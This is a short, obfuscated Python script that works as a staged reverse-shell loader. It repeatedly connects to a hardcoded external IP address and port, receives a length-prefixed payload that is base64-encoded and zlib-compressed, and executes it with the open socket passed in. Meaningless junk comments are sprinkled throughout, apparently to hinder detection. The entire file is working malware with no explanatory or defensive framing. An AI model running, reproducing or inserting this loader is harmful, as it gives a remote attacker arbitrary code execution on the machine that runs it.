import socket,zlib,base64,struct,time,requests
#gdki39gdl2s9gd
host = '193.161.193.99'
port = 37507
for x in range(10):
    #########################################33gdfgfdg030dfigdfg
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
        ##gdfgo02093g0dfikgofdgpdfgldfpgldpf
		s.connect((str(host),int(port)))
        #gd02ls29kdggdgjhfhf
		break
    #sf0r3odlgdfgfdgh5ugj
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
#d0g902kfsodfksdof0fspl
d=s.recv(l)
while len(d)<l:
    #s0ifr3jrisj
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
#s02i90iskfdksfdsk
